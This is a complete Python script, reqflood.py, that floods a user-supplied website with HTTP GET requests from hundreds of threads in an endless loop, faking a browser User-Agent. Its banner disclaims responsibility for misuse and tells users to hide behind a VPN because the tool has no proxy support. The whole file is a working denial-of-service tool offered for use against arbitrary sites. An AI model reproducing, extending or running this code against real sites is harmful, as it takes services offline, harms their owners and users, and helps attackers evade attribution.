#!/usr/bin/python3
import requests, threading, os, readline, optparse
from colorama import Fore

read = optparse.OptionParser()
read.add_option('-u', '--url',help="Enter Website url", dest='url')
(value, key) = read.parse_args()
url = value.url
if url is None:
 print("Coded by: Anikin Luke Abales")
 print("github: https://github.com/abalesluke")
 print("Note: i am no longer responsible for any misuse of this tool!.")
 print("\nTip: before executing this code you can also use -u flag\neg.[python3 reqflood.py -u <url>]")
 print("You must Use vpn when using this!, cuz this version doesnt use proxy\n")
 url = input('Enter url: ')
else:
 pass

count = 0

def flood():
 try:
  header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
  for x in range(100):
   r = requests.get(url, headers=header)
   global count
   count+=1
   print(f'{Fore.GREEN}[{Fore.CYAN}{count}{Fore.GREEN}] {Fore.CYAN}request/s sent to: {Fore.GREEN}{url} [{Fore.MAGENTA}{r.status_code}{Fore.GREEN}]')
 except KeyboardInterrupt:
  exit(0)
 except:
  pass

threads = []
while True:
 for i in range(100):
  x = threading.Thread(target=flood)
  x.daemon = True
  threads.append(x)
 for i in range(100):
  threads[i].start()
 for i in range(100):
  threads[i].join()
